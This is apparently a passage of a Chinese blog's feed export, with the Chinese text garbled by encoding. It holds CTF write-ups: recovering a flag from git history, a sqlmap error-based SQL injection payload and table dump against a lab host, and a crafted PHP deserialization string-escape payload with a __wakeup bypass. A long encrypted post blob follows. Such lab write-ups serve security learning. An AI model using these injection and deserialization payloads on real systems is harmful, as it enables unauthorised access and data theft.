+0800<p>flag<br></code></pre><br>å‘ç°æœ‰flag<br>æ¢å¤ä¸€ä¸‹ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œè¦å¾€ä¸Šä¸€ä¸ªç›®å½•ï¼‰</p><pre><code>$ git reset --hard 213b7e386e9b0b406d91fae58bf8be11a58c3f88HEAD is now at 213b7e3 flag</code></pre><p>æ¢å¤äº†<code>index.html</code></p><h3>æœ€ç»ˆ</h3>åœ¨<code>index.html</code>é‡Œæ‰¾åˆ°flag<p>é—®é¢˜è§£å†³ï¼šn1book{Z2l0X2xvb2tzX3MwX2Vhc3lmdW4}</p><h5>å°ç»“</h5>Git hackå¥½ç”¨ï¼Œè¿˜æœ‰ä¸ªgit extrack<hr /><h2>WEB-SQLæ³¨å…¥-1</h2><h3>SQLæ³¨å…¥</h3>é¢˜ç›®é“¾æ¥ï¼š<a class="url" href="http://10.147.19.176:7004/login.php" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7004/login.php</a><hr /><h4>SQLmapçœŸé¦™</h4><h5>sqlæ³¨å…¥ä¸è¯´äº†</h5>sqlmapç›´æ¥è·‘ç”±äºæ˜¯POSTæµ‹è¯•ï¼ŒæŠ“ä¸ªåŒ…ä¸‹æ¥å­˜æ–‡ä»¶ï¼Œåœ¨nameå¤„æ”¹ä¸ª<code>*</code>è·‘sqlmap<pre><code>$ python2 sqlmap.py -r 1.txt</code></pre>å‡ºç»“æœ<pre><code>sqlmap identified the following injection point(s) with a total of 1488 HTTP(s) requests:</code></pre><hr /><pre><code>Parameter: #1* ((custom) POST)Type: error-basedTitle: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</code></pre><h5>Payload: name=' AND (SELECT 7087 FROM(SELECT COUNT(<em>),CONCAT(0x71786b7171,(SELECT (ELT(7087=7087,1))),0x717a627671,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Uilw&pass=1</h5><hr /><pre><code> [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL >= 5.0</code></pre>okï¼Œç›´æ¥å…¨æ‰’ä¸‹æ¥<code>--dump</code><pre><code>Database: noteTable: users[2 entries]+----+----------------------------------+----------+| id | passwd                           | username |+----+----------------------------------+----------+| 1  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | test     || 2  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | admin    |+----+----------------------------------+----------+</code></pre><h3>æœ€ç»ˆ</h3><h5>Payload =<code>sqlmap.py -r 1.txt -D note -T fl4g --dump</code></h5>é—®é¢˜è§£å†³ï¼šn1book{bG9naW5fc3FsaV9pc19uaWNl}<h5>å°ç»“</h5>å–„ç”¨Sqlmapï¼Œèƒ½è·‘å‡ºæ¥çš„ä¸å¤šäº†...<hr /><h2>Unserialize++</h2><h3>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h3>guest.phpå…ˆä¸Špayloadæ‰“åˆ°adminï¼Œå­—ç¬¦ä¸²é€ƒé€¸æˆåŠŸ<h4>payload = your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}</h4><h3>index.phpä¸­</h3><pre><code>file_put_contents("caches/".hash("sha256", \$\_SERVER['REMOTE_ADDR']), put(serialize($guest)));</code></pre>è€Œ<pre><code>function put($data)&#123;$data = str_replace(chr(0)."*".chr(0), 'uuuuuu', $data);return $data;&#125;</code></pre>æ¯6ä¸ªuæ¢ä¸‰ä¸ªå­—ç¬¦ï¼Œä½¿å¾—nameç›–è¿‡passçš„å­—ç¬¦å¹¶"é—­åˆï¼Œç„¶åååºåˆ—åŒ–å°±ä¼šè¯»å–æˆ‘ä»¬å‡†å¤‡çš„å­—ç¬¦ï¼Œå³ä»<pre><code>'your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;'</code></pre>çš„åˆ†å·å¼€å§‹<p>æœ¬åœ°./caches/ä¸‹çš„å†…å®¹</p><pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre><p>å³åget</p><pre><code>function get($data)&#123;$data = str_replace('uuuuuu', chr(0)."*".chr(0), $data);return $data;&#125;</code></pre><p>ä¼šè¯»å–</p><pre><code>"O:7:\"someone\":3:&#123;s:12:\"\\u0000*\\u0000your_name\";s:60:\"\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\";s:12:\"\\u0000*\\u0000your_pass\";s:53:\"AA\";s:12:\"\\u0000*\\u0000your_pass\";s:2:\"AA\";s:5:\"admin\";i:1;&#125;\";s:8:\"\\u0000*\\u0000admin\";i:0;&#125;"</code></pre><p>å¿½ç•¥ä¸å¯è§å­—ç¬¦å<br>è¯»å–åˆ°å…¶ä¸­</p><pre><code> [your_name:protected] => **********";s:12:"*your_pass";s:53:"AA [your_pass:protected] => AA  [admin:protected] => 1</code></pre><p>ç„¶è€Œæœ¬é¢˜å’Œadmin<strong>æ²¡æœ‰</strong>ä»»ä½•å…³ç³»</p><h3>æ„é€ </h3><pre><code>O:6:"level1":1:&#123;s:8:"username";O:6:"level2":1:&#123;s:8:"username";O:6:"level3":1:&#123;s:8:"username";s:5:"admin";&#125;&#125;&#125;</code></pre>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{s:8:"username";O:6:"level2":1:{s:8:"username";O:6:"level3":1:{s:8:"username";s:5:"admin";}}}<hr />checkä¸å…è®¸åŒ¹é…åˆ°"username"å­—ç¬¦ä¸²<p>äºæ˜¯å‡†å¤‡ç»•è¿‡<br>ç±»å‹çš„å­—ç¬¦Sä½¿ç”¨å¤§å†™<br>u=\75</p><hr />level2ä¸­æœ‰__wakeup()æ–¹æ³•ï¼Œäºæ˜¯ç»•è¿‡<pre><code>O:6:"level2":2</code></pre>ä¾‹å¦‚æœ¬é¢˜ï¼Œ<pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>æˆ‘ä»¬æœ‰u x60ï¼Œæœ€åæ¢æˆå­—ç¬¦30ä¸ªï¼Œäºæ˜¯ååºåˆ—åŒ–ä¼šç»§ç»­å‘ä¸‹è¯»å–<pre><code>s:60:"**********";s:12:"*your_pass";s:53:"AA    |ï¼ˆåˆ°æ­¤ä¸ºæ­¢ï¼‰</code></pre>ç„¶å"æ­£å¸¸é—­åˆï¼Œè¿™æ ·æ¥ä¸‹æ¥å°±ä¼šè¯»å–æˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²æˆåŠŸé€ƒé€¸<pre><code>";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;|ï¼ˆåˆ°æ­¤ä¸ºæ­¢ï¼‰</code></pre>ä¸‹é¢æ— ç”¨äº†ï¼Œå› ä¸º}æ­£å¸¸é—­åˆï¼Œååºåˆ—åŒ–ç»“æŸ<pre><code>";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>ä»¥ä¸Šæ˜¯adminçš„æ–¹æ³•ï¼Œå–flagåŸç†æ–¹æ³•åŒä¸Š<h3>æœ€ç»ˆ</h3>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{S:8:"\75sername";O:6:"level2":2:{S:8:"\75sername";O:6:"level3":1:{S:8:"\75sername";s:5:"admin";}}}<p>å†è®¿é—®./guest.phpè§£å†³</p><p>é—®é¢˜è§£å†³ï¼šs3c{NEJHdTBFaWJtekd5QFptRXZiTERTVW5rRTE4UDZrRio}</p><h5>å°ç»“ï¼š</h5>å­—ç¬¦ä¸²é€ƒé€¸å­—ç¬¦ä¸ªæ•°<strong>ä¸€å®š</strong>è¦ç®—å¥½ï¼ï¼ˆåè¡€]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="article/Hello%20World/"/>
      <url>article/Hello%20World/</url>
      
        <content type="html"><![CDATA[<p>hello</p><a id="more"></a><p>è¿™æ˜¯æ–°å»ºé™æ€åšå®¢çš„ç¬¬ä¸€ç¯‡æ–‡ç« ã€</p><p>è¿™å·²ç»æ˜¯ç¬¬ä¸‰æ¬¡æ­åšå®¢äº†â€¦</p><p>é©¬ä¸Šæ¬è¿åŸæ–‡ç« æ¥ï¼Œè®°å¾—åšå¥½å¤‡ä»½QAQ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linuxå¤§ä½œä¸š</title>
      <link href="article/linuxprogramme/"/>
      <url>article/linuxprogramme/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç ä¸å¤ªå¯¹ï¼Œåˆ«æƒ³éª—çª." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="edac3b509459ea1dde7ac6095ed87608f52380468230b537be259dc1e243314a">acff4705a538ab3d2e8d1867fa2b50da9a1640994d2649191c3b0d2882ea059e078ce3184479436ba540ea736eea00a26ef0d47536e6a8ba1ece4fa00d4edfc233661a1f5b528136d53602d2b07301d71f9695a477a81791e35a9631c780471f95636cfb7c7f5d180e87d9cef50eb4b3afcdf001a7287781e75f53d874dd9a0ca14e0adddc31ce467c7be83e0843852f8421c474f4c5de7884b597b0e487425b41418cff874e2ca0a866f126a5de413d7686e873a02252fe36c9f1de918d5dc896495e77e9e89cb6d0cb088f4856a1b26b7f5fba80658a7e15e37b88b8cda3d2c10b2e3a80e10394a039bbcb9931a0f1052cd5c61dc3a1b91121f30c845e7982e3b9b9f0828110d12c890abbf41ea668d6633d287da4b6dbd82bcfd4a0b07f3d7f309e7437a25620f053ec592429cfcbdad93bc1834f0755d473406bb0e8184355aa4a409aaccf4961beb53c95dc028ca5daebc34234adbaa196f170b42393c16c9023c2f73a19075730a5001f998c672f7012bda6d0e789a316f518b7fd7ffa4a4e9137b1ac6fb352c0918911d4e4b4ff76ba5e29cf94fc83d5917efc324551d5bcc6237ace3c0b83f356a21be7c65be829f2b574b17ffdf2530e8791bb53620a48f74dc1f49db207df13884ee455b851108887f3a4810fc8d97c7ee09dc5f366b1231b82806481ddec1a619d4a1b00d7e9bd28562fee938979df69cfb2f5334131abbd0d2c3c0d756a3d85569b888dc071c9b4ede3204bb89fb692a153007f9cbf810125262ad3c6ca841f79b5687942ce6eefa4764160a97ad780e5fa46c1bac50daa539e1be4e423cba2c541324b32db0a611e97edce81229ec32bd6d80f5c891ce38021dd2fdd8fc94da6ec51942373bd3d45141b911afae3ff4132b7c2406e9ab7df8dae4d0924dc8c62af70d963a70f97688ca94cbe5998ddbccc2ce5c4729ac858a95a8367f1d126f7c4471c0ef679434a182fe9937b169cc31a676db877360be8551f818f74c53354af1bf2631f729f6d29d12e85ad12fe2c4fba2252a8e767cea338734c14adbce72e7661ab303459ca70ecd1adb7c611fdc831929569fd7d63ae9fbf7e70a43423965c4f18d29eb62b7a7e961cd55c2da242be67a88caa85b0dab5cd4efde5c47d68b9fdd5d118196f631276d17f4c34289a0d536269c6b96a6254fd43dcb98e787ffd4cd3e1fca0e72296e32c2ccb1a2165a3a6600eb6b6b161ea5ba5f22bbda0bb18283099a3ace86a35e440e1c8b096e98fe946654e2c9712a8a43c4563514a687709620f6f4cf2e49391f77d7fabb2382b0faf4d5b61038d6309fafb69dcaa6c147b5d3dcf6861b543af9298fc2da1903f91abf9c1a097dfc63344013ecf03b37a25726306457fef03ae1e436cc12c541fe34cb84619fc01e8e9ef8948b596fa60b3fc6d1e6d28f2b2f38a3e1281a12358a9ddf9a833a9218cbe8f46c7d2b253b48cd1c7c8404de4648782022988c2e808449db8d6fdec878c3723260fa1d6a4a90cc3335c513871fed4b7b1718e3fdb0601c64d79feb1ac04dff610b34a2fdd66243e67a353c05fcfffcd03df576a61dd839fc98cfb0df8fc67673d5f69cdfdab4e9b31d020118d97922faae6a51a95cfe2afa6f765e9175ae2694e488257dd2cc652442eacfafd024002afd2040769d5d18111aacc2bd1c94734bd35442a3fe20fc29ea3333d21ee93092947f2ffc3aefa9b6ac1ceb7cd097bc103c5e48dba22e31b43fba336cd6b2fe92160333daf669eef6c36f4f6b1485e6d2214fcd6bfbd0aa34930207fbed4da4f09b32438d7cd6a8c855f4d618f52d1e421bc98346ddb06b34b771571d4f2c769d6929d6f5387a15d750e20d1f23de4f86b386c3e5c956026404a95ce972542f9cd8e1036325c256707786a2b5dc6eed112fd5156652d65c0f05a99dd97a824d7d0a8d51256e91c364c5b1f9fd2583710efce180b623ff25a32daf2bbac7fbc649f01ebc1422ca1df2da55db9cc12994137c702dec09d103f414e232f7f0d66556680918e95dbaa6ce04f88b428c13a42b718d3668abdbe824a40314f23b17ae1b6f0297049bd04706b55277683876d08e3a7c9f0f0ea6079534d47b852c3a23795f87fe9b53df18774dbdb2daca31ae1bf6fb8174e5ac3beb81f0b016602c3bcf6eef2febfae8d83e42c563aaac1075c9930af993f6f936dbaf872c9b532e8752027b5ea7f9db5a981b29007801a4a964c18364508413712833ba60f5f0492bc756ad3995c61218392a83adf4816c331688c7327c56e7e8c6f9a14d09f188fadeb1b17cf243fc7ef9344ba0ca4c61243e9cfa4a86d0574c26c9a7bfa7936c1cf2db64d3951ff96c84b1f8ffe78128e44f7ef6224ed350640ad2abd0c454bcd695a699d525db879e48bda0a810d8c3ca07dcc13416a444d1cbc63ea84380a3baa50920086a4e683f1b176eb11068927fe6c6d9a882db18a3947c8f01a01416e880513ef0ffa514a838669c847188079d043b05aea244f67534dfc5ecb612a524029812f8a2b57d5fd6c06e953e0875ecc7821e2cfb53fe7b72474500ed09c1075c55b504018d4cfb58e904441106e6ec21dbb707a7cefd1b67062b348c7975756ec801a47824ad824f64fe31bb55cbe464f07422d307215737720f9333d5c7b2e21385d6c2d6aecca355d4b7b3e93f620d6ff05c6641958c1e52c84a229d3738d58f0f7bba165817b7378950cd66a06f0233d54d412465b9806ee0c55f659bff10743a27207951ccf8d6df5d64ebbb1b662899839de43e2eae5414b76b3da826b8a07c3a37bb7436b78ec9063cd0af4e0dd8516e04c434bf600ffa2aa8f63b3a44c26d9a7c0ff4acc243a128b0f43c997bfa67e998150385bff596a74ccf32d54288440074652e152e1461c5a8043742bd3eb87a314fe472dc4443b1df57e60571df610a8cfed34dfee70b65979d5cd22440d9933649cde823fbae75e825ff6749cf676970e4ed388c773f783b30d005f9e05eebb371b3f34cbcdfe9a4c07bfe725434ccd08fb2b24335e912f016a740a5fd23b34aceca452e575943d4ede1e8bcae11dc78be792446a3566e9f23b8cc130448976e8f694855b37df9e2be4fb48c9d09b550044c8bb5cf06c36b2e69a69985daa13e074d88ff8c776226c864d31908e7e4b651e35848769d1dc4c78616ae7dc3ab7c9110dff3dae21235a81e5ada8cf4f0f6ffb54b2b247a2cde985f612afdc3315b29930f9ae43d82e6ab49e3113e18ee96b995a89a9f331d00b4ecdf1aca700b657a1740487efc9c1c4a650b3ee012519867566684756aa930eef69755ec0bf1ed379a6cd5b0262401349ee5c52adf0aa594049a4773a540b5073d2512a1f8f7f8c1dfaaef0d7fe16ddb22157c51a7056d6557174583130361e43c6046b907fd6946a59bbc9728512db2fcd8cfdef85d86a36ea7b2c61ef96f3d82efed5093cff91616554599f7a3e4cd1beca9e53f3fa927aeb706bead053f1f9718c884d4c75432cd6f6266f0f9e3cc613fa446cd97450481e7032eccfcd779f9c7a1345033d079b91db0092576d7b718d5290500d6434cfe0e3c672bb6fe7b4c9afec9481d4bec24dcd5fdc2e9ecb2a8534f62d28de4b454d3edeba78da4f0fee951b7fd6b081945cf05c58982c6127e6744c2dbfa49cf9ed3e0a80b216b9a0404b13ca6e41259df52b533b6f346ed273e3c182c94afc2b087bb1a99c7935670d16c845f952179046624b614b575e96c018ae63141879a8125d17404732bbebbc65e4d088457848d4913d3752c2149539b005b9a96543dc4cd7277e44fabac62f22b0b09341775194cf291bc336182a48438a2f0c333f4937df53dee70d674a3bd46164f3520296d93485a04f3eb9324eeb7bedbdcabf1657e535ff0ecd6e7bddb99ba5b37869ec7f9668e60520477d17fcaab89fc813081fe004a9ae30a8ed3e07a90330dc642f5b7a6ad7f68d43289a6cfd8b5a8176b1f4aba5d178a6a389d60f84a34d700d5f09ea106886c58ee2e0bdb392fbb64fda5557b2dc4300d614b7049332242f44de4cc2bc393d289e038ec9e560f467e606648775f11eb428864a05c3f19e49c8ae09bbe41af91efbafd0efa519b74874d4402134803b4e8af62094d06249d2fa0d85ef0c0ff46b5fd4d479105f75b4cd432b3d5fe6995de472397d46e9dc72506aab08b294b2c0ac53b5f862b66fafc6504b52567a781d69c239a5cbce6be5906b38922221db93a37de4983120a09c34fa10a3a555ed9a9223a989597ea1c9b5821b7573a6454d42d2ff348221dbe9787bf524ee4f2e7a8b09d7a4d485d79ae808522b99d3492436613317901b3f8d9c2150fd59de449ad97248fdfa75c2a802e43185eafbcb84d0aa6a44501c78c02d2bcbdf869772de0b3c05f025dcfb321fb18126fd31b08318a3078395ba41e9af78dfed47d6b77f545e33f278d56bc12f85731d64345025c6495d222d6066b47a255743dda801a8b9329e2969a5a65f515f66a8b77590192f38a10895ed28c7187cbbf0a2a3090a4d4618fb5bee332200d51e4db1710fe082df190dfe2a016e5a53b021dbe4a858e10ac293cf7acaff4b016288fc35d7593eccc131f71c42c449965db55ce498a7829323b897ec08bcbb043400589a1f9e0bcf57011aed9fd5682fef4641b36b691ee582016ddb5405e401f40a8bdc7ad9e7c12e0e96482fcff0ca6ef181f0f39410e563071182e7f5b64ada134c786a42d4c91388633eb23564ae494e90eb3d9d87aa55de2b8d0a9820df169a0e735e4bc5b9c63cd917c2348b18165993f4537d591d1af65619bc28a5e94267b810c1539764ed6713ce0908986066560566a8101f271ef9db243af34e157ec58ea57d3c93d3118bbcd04071d2146b2d7387b34206fea5be8c01754601ff2019ce2a074f281fc55f96474f294bdabf872914969e6b885c77e1b8a1704166ad0ed33f1ace6b0d6c1b06e4f4ec6e57bc3c7688fe7735c7cf11764a2ba14286f9569480456b719495ea8dd25358b5a1fce9bb9c0dd3939d52da4d0e07f6b71499617156e59c8a3d50c0c94620d0f24991cdcfdb93e6e92c43068f329c1d040312d9471fbae248dfe43ada246618d8ae95a11bcc8c2232b478db891d7787cf4b5fcffd8051324c9068e360153b0063862b661678ef57d3b2396251aeddfbdb22793bc7a90b022de655ccf5adbe1692c639d0326aafe52caa092017d3f14ed81f2ccea47b757f3c8caaaf2e4e32c8f727f6041e16743783a8f8dc67858c7987a39ed3d5e77722db3175294cb1559098f7475d1f6f54124625b567197a195060dae9107e572a8772d157435193ac2d0c7f1a3167b33cd396148accbb8437ca85d17d4b179abcf5a74f027492f07a5f62e08af188b3c93e0f5fafbe75b7f448638fee8a1a21bee64990955ce0c5d1bfbf9b267e10d9de3dc61a71a20e74bdd1b468d533456b0d0cd1326aea671ce89acff8e842e723022fb328aadc81368ffa371f0a51179c4c04e0d0e4704e48cc938e3c951247f8009662b8e1d94b63c624dfc7c9760f7dd38acf1deb71042155abef6a4fc43e49addb446b71337f9a90adc1d5ae084ad02a7144dd6565f95aaa2bbbd69a97f511143ba4e92867953483dcb98487b020f7baef8547feddf7715b2904d3cb76a90a12ecad7a8d3ea75931bad867cceaec0fc44726befd4dac146f9615c875e8eaaa0a66fb8f59dc98af8189167f9adfadab92812c04d4c862c5d05a4600fbf2ca70974bfa2a312cc8aabce6d215c0e2e15471b1abc6766631b97809b3751b72b6a06c2d630522d8caab98792ba61e4229d90a012f1283f1bd7c54bc02b5675fa08e67771f516b61f3fff32014ec51beecc0005a4e6e5ef88e8180a0fdf0cd6d16bace7dda36653c7bfbd03ce84f5dbd9794433d6ca5809a08d6172ec6d6c5e8e2052f35aa0f4b6d537ff1b5ff15871df5cec72dc3b4210e92841655d79800ccc7e3e038cb2434c59b9557b248b49b5512af88e14499f3fb537b5672a24eb48cc81bc66ac7387f96ff791d8ebd734947c3a274b3b1cf244ed67a5d4a8f210f1ddafbce505267df0f5825e8b9d1883a7275fe11e0826c8ec974d30ab40cb0fb8dae002960acdfd8dc605a1553d3f56c246cee1354656c7c4fe5f691490f4212b31b574abf9c10a38985c3668cf8793822e9b9c9b18b7a776fdecc647727f92ec3a01d303c707137b934e2d7291c62f3e7704d6bb5a0924b96be751e6aa653b0058c03dfc275aa2ced7e58dd84cde7c8f9359916697ce7b39d80da43257824794d5031c53b2f5409b2b070b09c82adbacbe6172148863c30dfd4412b6491de925af2dc6c9c0ed706ff09e00e0314951d20696c53d3446ec95263a6aaf81556c180f4f73a85fe853e858d2f9e5c12ceb5b12127cff9d0d81a72e8eebbde5cdf8f8f62459cec8304d699f0846ac77ecc38f337528121df2829cc185f319c1681681ab1efa9b88ed83b6f3a32b0f828a5d381eb80f00017c4b6ebc85aa95e8147e9775da0b8a63fac9dc2283e6fc1f9b7fe73c0c4494b0d77417c7704824c2c6459dc631feca805bf974fe3490d58524eb9a1e4844bdf580502f61289726184ab77baf1be3a6af512cf850f3261f77cf8e91d8585a67315aec8e338fc5126e36bdf48475946dffa31b2eafda49dc947cad591c69a76c06f91f7d4973b04e62d6f5017ad549561e42b1f6faab5291632ece2e00f1d79e083452c694a7df5c8652da40a0b7d5dd086d97ed9af4455ab68573b79edc2806040696f337233d70343f648903ccfea390573fc4715bb40ef82020d064c3ccc07d0f3930e45da672f4447886234929ba9f884b3c4fccbefc1e567983e038d06414186d1a46932ec8e2848a1e5855b271cdb9d4d2e47b50f739db195eb1d8e2cd12068910a2ef9e940f4a1630b620159a1b59d84c95ce06719c59cc948a84be7a4247eb35f7ed0ba1ed2acda4cf1fb424e4b4582ba59affec6f1c1ca879cb27b1a228649d6e4c3d7df6f2101665e2c2499f3c6cb7d4c62d676e0ed8aae4cee2b981d3e09dd995b5ca6b051104ff0db5d051351c864014459081daf8a99d201267f44cc25832da01665659a3e2d2602efdc419db81fb5fba0c514dca5d32d8d2d94b51b459541f9eba18789aa4f7aa6c14a65aa753405531ce7891398ef7b4bd2efc3db5feb1bfc7c5cdb482a9d56dea4840ec5e9398e2b0dce10021588659c5ea057b99a5de82279b9122461a09bef089f5bcc86a28704afa04528fd0728d3508a09c2e4574a4f5065d66f34a73c91b33853eb904cd9d529393008da406a8e341caf0df4aa4834b7c6ebb5d11a2e2ce01238ba6a13960c6f680a6dd08c0b7ed51830c0bab5d12976602bec57a11172e45bd1df0040d4f968e9c9be8e1ee0202f1577f604d0b95ecbcd8eb49b5c7a17c6c74c0606f5d7ad0da9cfd11f04700e9db9c91b86afb2f71c4d04290b5c894574d53665f2c613db33844ea90142ee05676e10a6a35c9fecbf66b4e3ba059d5fc2aec1b6133e72cfc10e16307fde4f5efdeecdc3947089dea83211f607e0c62649a2a2990475cd8c4f06754e4f0cd7040ccd7dd144926c77f810dde2db4a8212443ce7cf5648679f2413ec68b89bc34ffeeef8911f67debbfb60998ec224059e305bb820a0b1ce1416af9e68c14ee3726804c992cb49247619dea9d5c23486f11a88fc2597569e947a1077b2624bc1c4a5644ccaaba55b2dd4a710d7d3316726eec407c50ffa66b8eb9ececef0c54134585141a7e96419a1d5ea97ea8c7478f4cbd84f01456fa508dd019856858fa1583522518f7322d35ee4b4132d5b584f6ce2ab77d0bad8e84f8ec6bd83a96b4c39a90026d744b443b35397a69947b0bda86fac7f2896037804357fa1672cce1dc5855ce5ea6b51d32cca3b17d03d9cf66830269d031e92032904956624400cbd78b61ce0634a456e2440f763c0caa4a89bbfea54ba6f8f51d1185f093491dbbbefd42b1d1b43140275d097851d5a7a671246cfdabdfdfad8efc064eca6f4ccd0121be68e22e560b55f114e371ee199d689709d89031062a065ad08bb14f7ad9f683dfbef968594cd548a6f0ba79a7407f7e2fd987abaf11c07c315db10998c8f7cd466fddb88fd4f8c1b98f4b371aa50e891e18f699168ecfa76e7bb84946b3c9fa471d427ee24d8a3b0acd3474b76e453c3434568f8c6c7cb97124756a835a0a6db14269b21d666bc5867885d03a74ab9a1425dde712eb600fff24d7110c46fd7ceb56b16576933b24758260318017935902555b318e8d14f3f64c9d014a2aaf0d36a9a08f118b22e5b71b66559ec21bd2df7fae0808ff9f414a65dcf35ef21ed3ef3be74fd192f021aae858cae1257119d3b2f7c373e011ec24f0e9c1517cf25acd211b2606a0633055f1fc686b8cac0ca014becf72cf47b7028d2bbc37a83b0ea0bb4cf48811b567a0af6d43858e3ed573bc4e8ad43713e57315840ff5f611b3d6ebf4952a2e708cc22ceee17fce368707ac9fda3cde6017f9a7c7809520b62cd4ee6158eb142299da192cabcd6e29a823b9f31d988fffafd54373e3dce6bb7e61ce6f9e409320342014e2afa0f92231cb2cb22a1994f7e9caa287880959f5d72514c1d7a196c9dd7580649755ab4fa037d73a57ca2c41cbdf6210120b3720c380c272db880fce084e9a63c222ba06e652bd5f943f97564fed3b397968ab43237bbae1521976fa2dc7db591f9b97a8f54aeb5f5668ad63958b8b4ac4fc4b6153e4b81bedb0045ff509f4e601011af8b6e3069deddb7bff3c7a93e5c59229677f5c14e3bc4503394a4f8e906fac0f6b9cde23bbfd2f324ca785052c8bac0389b92f1361b8fc3776e6296c5291a9eaf975470ebe184a6b8bd47d53ee68b367c6f3fc9c378ffdf42452d8c8de046193fd881de5750670d4f4f05aa87dec913ca46d4e496a2a2dae7056397d38023b3f9ee40f815da420aa292bf8ae2259691340ad98d6a1c871ca47709cd64656f25c2396059b2b672f125a149c981b0fcf96a3dcf037bc4cdb5407286b7b51b56d24a981c45d58d9b89db4d0909a07b199b6989adb78f95d1b8507744d07c8cb60ca224ba7553164e3e149d58c53dd1a2aeb5b865238cddd14d8c7d77e5115c8f583d9fe76c8bbaa9a4d5c47cfea418c334ad9c87f5962c562aaa7baf0e9f761b24b377c6be58a8b4b298da9a036b788b786a4d0007c17828aa39d3b8f1f7536e420e24a31a8a156e4a960e8c59d55f7c55d6cb410453e703bfb3b1e0085b896a67f779bbaaee766238c29eba029620f5c8e1291e7901ed4fd129bae954916ad799b21902bfbe4e1c9e9f6a1c7800a68896d11668dc5ce2b3f5b0f21564ee47a40d3f8b3427c0de4aeec308ebd33c3f12d45a7ce771f0ac8f5c10fa63cfc178dd096f50bd6003681c21eaf6b4f70504d9957bef4ffe1a08ed9a84d6a63e51a9d7c7a7c80d9f3ee85e3f35f6b27e6e878aef8fd23390c8caf8ebfc665b0fb62464c9eb3582d248d85b7ad7ca649b3a9ee8e6bf323da8a1f31863edf42575f0bef6a5dbad00df96011df82c75ef1ee52dfbd5906d99ecbfeef486cb4a7d55ec3dc34d7c60794474845836d712f5f910eed9cefa0d7bc3371777a4400206fa5f036aae039e6cb22e3caa40628d310d9cf3f363d9dd2d7373828a5c8e73be2869f09f5fb956e3c5041c33a5c3b810db4e0504751b67ace7a01376eb848265f2cccbea47d5f5cbafc39bbc46caf683c945960d7db65c0fe9b194244d305ed2a73fd3c7a0e4c2f8daacd59433b0ebc5a68cc06bc350fa33335bfbb6b125d8cb512773e0b6150e564d6731b42ddc31a2308623418752e978c0371c26a3b247df0edb05f709598ebd8421aa77f44456184f92dc529eea139195cae3b39ae91eaf1032589f51f08fe37936a5f6d30e6e5079e9c0a1fa63c8d50785959a4bff3e53dabb0abee102469024f22ffb5125a9908f28c65594e20f708c264ec6ec62b09d43fea5398425053f94a03cceae97121d63a8bd100410b4b2aaf9179ab47a8df171b2891171699656ba4b6977f6b15ff4f06fa3dceac67115fa323ee0e48d9d8e65a5a3cbb63791cacfb4f3cc92b8c4b8506a0ff1ca4411cef12bffc17203af94ec542ee8df75abeba0bf9fc265832449dddd6c3de3b8154a36670129c5735511f22d4d7679e6c2ff47a8f6675b07ab88101350d1e4944464f2838a78a07ad3a756184fe7fe0668c46e475bd66320b81172bd258fcd8b251ce501c41465730d53e0ffc3285cb9decc8ecb3e932d4993199464cabd5cdaa1c97d1ef0b42d05d78f896aed1c048e3206464ba7ba8e3e48273ecb6002908626ac89891e9006ba01af298a655386d844dd87158f5173a46f09651a32c3e6441e4f00751ade54ff5c75f3dc0e237f3f3ad733fd507455ee8e94fd744deafedd1f69cea57fb99f3a90eb203fa1d3026d700eddf4c2afb4f5f28ca095daf729c218762874c007039dfc2d091637e436b68bddc844666bf8bd6d129676a3be8e7fa197481ab7fc8edf1f9d